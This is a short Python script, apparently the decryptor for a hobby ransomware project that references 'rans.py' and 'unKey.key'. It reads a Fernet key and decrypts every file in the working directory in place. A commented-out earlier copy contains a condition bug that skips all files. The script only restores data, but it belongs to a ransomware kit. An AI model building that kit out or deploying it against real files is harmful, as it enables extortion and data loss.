#  #!/usr/bin/env python3

# import os 
# from cryptography.fernet import Fernet
# files=[]

# for file in os.listdir():
# 	if file=="rans.py" or file=="unKey.key" or os.path.basename(__file__):
# 		continue
# 	if os.path.isfile(file):
# 		files.append(file)
# print(files)

# with open("unKey.key","rb") as key :
# 	secretkey=key.read()

# for file in files:
# 	with open(file,"rb") as thefile:
# 		contents = thefile.read()
# 	contents_decrypted=Fernet(secretkey).decrypt(contents)
# 	with open(file,"wb") as thefile:
# 		thefile.write(contents_decrypted)
 #!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet
files=[]

for file in os.listdir():
	if file=="rans.py" or file=="unKey.key" or file=="decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)
print(files)

with open("unKey.key","rb") as key :
	secretkey=key.read()

for file in files:
	with open(file,"rb") as thefile:
		contents = thefile.read()
	contents_decrypted=Fernet(secretkey).decrypt(contents)
	with open(file,"wb") as thefile:
		thefile.write(contents_decrypted)
